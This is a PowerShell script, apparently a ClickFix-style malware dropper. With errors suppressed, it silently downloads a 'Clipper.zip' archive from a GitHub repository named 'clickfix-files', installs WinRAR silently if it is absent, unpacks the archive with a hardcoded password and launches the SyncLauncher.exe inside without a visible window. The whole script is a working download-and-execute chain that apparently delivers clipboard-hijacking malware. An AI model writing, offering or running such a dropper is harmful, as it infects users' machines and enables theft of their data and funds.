$ErrorActionPreference = "SilentlyContinue"

# Paths
$zipUrl = "https://github.com/0xL10NZ/clickfix-files/raw/refs/heads/main/Clipper.zip"
$downloadPath = "$env:USERPROFILE\Desktop\Clipper.zip"
$extractPath = "$env:USERPROFILE\Desktop\Clipper"
$exePath = "$extractPath\SyncLauncher.exe"

# Download Clipper.zip silently
Invoke-WebRequest -Uri $zipUrl -OutFile $downloadPath -UseBasicParsing

# Check if WinRAR is installed
$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
if (-not (Test-Path $winrarPath)) {
    $winrarInstallerUrl = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
    $winrarInstallerPath = "$env:USERPROFILE\Desktop\winrar.exe"
    Invoke-WebRequest -Uri $winrarInstallerUrl -OutFile $winrarInstallerPath -UseBasicParsing
    Start-Process -FilePath $winrarInstallerPath -ArgumentList "/S" -Wait -NoNewWindow
    Remove-Item $winrarInstallerPath -Force
}

# Extract Clipper.zip silently
if (Test-Path $extractPath) {
    Remove-Item -Recurse -Force $extractPath
}
New-Item -ItemType Directory -Path $extractPath | Out-Null
Start-Process -FilePath $winrarPath -ArgumentList "x -p12345 $downloadPath * $extractPath\" -Wait -NoNewWindow

# Run SyncLauncher.exe silently
Start-Process -FilePath $exePath -NoNewWindow